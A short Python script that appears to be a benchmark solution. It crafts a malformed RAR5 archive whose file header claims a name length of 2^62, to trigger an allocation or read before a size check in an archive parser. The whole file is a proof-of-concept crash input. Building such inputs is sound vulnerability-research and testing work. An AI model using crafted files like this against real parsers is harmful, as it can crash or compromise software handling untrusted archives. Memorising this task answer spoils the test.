import struct
import zlib


def _vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint cannot be negative")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _block(payload: bytes) -> bytes:
    crc = zlib.crc32(payload) & 0xFFFFFFFF
    return struct.pack("<I", crc) + payload


def _rar5_poc_bytes() -> bytes:
    sig = b"Rar!\x1a\x07\x01\x00"

    # Main header: header_size=4, type=1, flags=0, main_flags=0
    main_payload = _vint(4) + _vint(1) + _vint(0) + _vint(0)
    main_block = _block(main_payload)

    # File header with huge name length to trigger allocation/read before size check
    name_len = 1 << 62

    # body excludes the header_size field
    # type=2, header_flags=0x02 (data size present), data_size=0
    # file_flags=0, unpacked_size=0, attributes=0, comp_info=0, host_os=0, name_len=huge
    body = (
        _vint(2) +
        _vint(2) +
        _vint(0) +
        _vint(0) +
        _vint(0) +
        _vint(0) +
        _vint(0) +
        _vint(0) +
        _vint(name_len)
    )

    # Resolve header_size (includes itself)
    size = len(_vint(0)) + len(body)
    for _ in range(10):
        new_size = len(_vint(size)) + len(body)
        if new_size == size:
            break
        size = new_size

    file_payload = _vint(size) + body
    file_block = _block(file_payload)

    # End of archive (optional): header_size=4, type=5, flags=0, end_flags=0
    end_payload = _vint(4) + _vint(5) + _vint(0) + _vint(0)
    end_block = _block(end_payload)

    return sig + main_block + file_block + end_block


class Solution:
    def solve(self, src_path: str) -> bytes:
        return _rar5_poc_bytes()